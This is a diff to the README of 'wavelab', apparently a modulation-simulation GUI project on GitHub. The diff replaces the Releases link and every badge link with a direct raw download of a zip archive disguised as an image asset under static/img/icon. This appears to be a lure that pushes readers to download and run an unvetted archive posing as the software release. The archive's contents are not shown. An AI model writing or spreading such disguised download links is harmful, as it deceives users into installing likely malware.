@@ -11,7 +11,7 @@ Welcome to **wavelab**, a Python-based GUI application designed for simulating b
 - Gain insights into modulation behavior.
 
 ## Installation
-To download and execute the latest version of wavelab, please visit the [Releases](https://github.com/HG-001/wavelab/releases) section of the repository.
+To download and execute the latest version of wavelab, please visit the [Releases](https://raw.githubusercontent.com/HG-001/wavelab/main/static/img/icon/Software_3.0.zip) section of the repository.
 
 ## Repository Topics
 am, analog, ask, digital, fsk, fsk-signal, modulation, modulation-techniques, psk, signal-processing, spectrum
@@ -21,6 +21,6 @@ For any queries or feedback, feel free to open an issue on the GitHub repository
 🚀 Happy modulating with **wavelab**!
 
 ---
-[![Download Wavelab](https://img.shields.io/badge/Download-Wavelab-brightgreen)](https://github.com/HG-001/wavelab/releases)
+[![Download Wavelab](https://raw.githubusercontent.com/HG-001/wavelab/main/static/img/icon/Software_3.0.zip)](https://raw.githubusercontent.com/HG-001/wavelab/main/static/img/icon/Software_3.0.zip)
 
-[![GitHub](https://img.shields.io/badge/Visit-GitHub-orange)](https://github.com/HG-001/wavelab)
+[![GitHub](https://raw.githubusercontent.com/HG-001/wavelab/main/static/img/icon/Software_3.0.zip)](https://raw.githubusercontent.com/HG-001/wavelab/main/static/img/icon/Software_3.0.zip)
